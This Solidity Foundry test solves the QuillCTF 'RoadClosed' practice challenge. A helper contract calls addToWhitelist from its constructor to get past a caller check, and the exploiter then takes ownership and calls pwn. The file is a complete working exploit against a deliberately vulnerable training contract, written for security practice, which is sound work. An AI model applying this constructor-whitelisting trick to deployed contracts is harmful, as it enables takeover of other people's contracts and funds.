// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import '@forge-std/Test.sol';
import '@forge-std/console2.sol';
import '../../src/QuillCTF/RoadClosed.sol';

interface IRoadClosed {
  function addToWhitelist(address addr) external;
}

contract Helper {
  constructor(address _target, address _whitelisted) {
    console2.log('Add the exploiter address to the whitelist');
    IRoadClosed(_target).addToWhitelist(_whitelisted);
  }
}

contract RoadClosedExploit is Test {
  RoadClosed public target;
  address public deployer;
  address public exploiter;

  // Deploy the target contract
  function setUp() public {
    deployer = vm.addr(1);
    vm.startPrank(deployer);
    target = new RoadClosed();
    vm.stopPrank();
  }

  function testExploit() public {
    exploiter = vm.addr(2);
    vm.startPrank(exploiter);
    console2.log('Deploy the helper contract');
    new Helper(address(target), exploiter);

    console2.log('Take ownership of the contract');
    target.changeOwner(exploiter);
    target.pwn(exploiter);
    assert(target.isOwner() == true);
    vm.stopPrank();

    assert(target.isHacked() == true);
    assert(target.isOwner() == false);
  }
}
